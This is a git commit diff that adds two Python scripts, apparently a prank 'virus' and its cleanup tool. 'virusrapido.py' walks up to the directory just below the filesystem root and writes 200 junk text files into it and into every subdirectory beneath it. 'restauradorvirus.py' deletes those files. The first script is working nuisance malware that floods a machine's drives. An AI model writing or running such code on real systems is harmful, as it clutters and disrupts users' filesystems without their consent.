e6effbba24d5ed93d6f252853652450635738948
AngeloMan <angelomandeoliveira@gmail.com>
2025-02-26 17:18:16 -0300

    Add files via upload

---
+++ spamdetxt/restauradorvirus.py
@@ -0,0 +1,64 @@
+import os
+import time
+
+clear = lambda: os.system('cls')
+
+t1 = time.time()
+
+n = 200 # números de arquivos a ser criados
+ar_nome = 'KKKKK.txt'
+total_time = 0
+
+def printtempo():
+    clear()
+    ct = time.time() - t1
+    print('tempo total na inicializacao do programa:\n', f"{ct:.2f}")
+    print('demora em media 1 minuto!')
+
+dir_p = os.path.dirname(__file__)
+while True:
+    try:
+        if (os.path.dirname(dir_p)) != dir_p:
+            penultimo = dir_p
+            dir_p = os.path.dirname(dir_p)
+            printtempo()
+            continue
+        else:
+            raise Exception
+        
+    except BaseException:
+        dir_p = penultimo #pra deixar mais de boa senão ferra o pc inteiro
+        # print('limite f', dir_p)
+        break
+# dir_p = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
+for i in range(n):
+    nome = str(i) + ar_nome
+    arqui = os.path.join(dir_p, nome)
+    try:
+        os.remove(arqui)
+        printtempo()
+    except BaseException:
+        pass
+
+
+for dir_, b, *c in os.walk(dir_p):
+    printtempo()
+    for i in b:
+        final_dir = os.path.join(dir_, i)
+        for i in range(n):
+            nome = str(i) + ar_nome
+            arqui = os.path.join(final_dir, nome)
+            try:
+                os.remove(arqui)
+            except BaseException:
+                pass
+
+        a = os.walk(final_dir)
+        for i in a:
+            for j in i:
+                if type(j) == list:
+                    for k in j:
+                        # print('123')
+                        printtempo()
+                else:
+                    printtempo()
---
+++ spamdetxt/virusrapido.py
@@ -0,0 +1,47 @@
+import os
+
+n = 200 # números de arquivos a ser criados
+ar_nome = 'KKKKK.txt'
+
+dir_p = os.path.dirname(__file__)
+while True:
+    try:
+        if (os.path.dirname(dir_p)) != dir_p:
+            penultimo = dir_p
+            dir_p = os.path.dirname(dir_p)
+            print(dir_p)
+            continue
+        else:
+            raise Exception
+        
+    except BaseException:
+        dir_p = penultimo #pra deixar mais de boa senão ferra o pc inteiro
+        print('limite f', dir_p)
+        break
+# dir_p = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
+for i in range(n):
+    nome = str(i) + ar_nome
+    arqui = os.path.join(dir_p, nome)
+    with open(arqui, 'w') as f:
+        f.write('ola')
+
+for dir_, b, *c in os.walk(dir_p):
+    print(dir_, b)
+    for i in b:
+        final_dir = os.path.join(dir_, i)
+        for i in range(n):
+            nome = str(i) + ar_nome
+            arqui = os.path.join(final_dir, nome)
+            with open(arqui, 'w') as f:
+                f.write('ola')
+        print(f'{final_dir}\n')
+
+        a = os.walk(final_dir)
+        for i in a:
+            for j in i:
+                if type(j) == list:
+                    for k in j:
+                        # print('123')
+                        print("   criando",final_dir,k)
+                else:
+                    print(j)
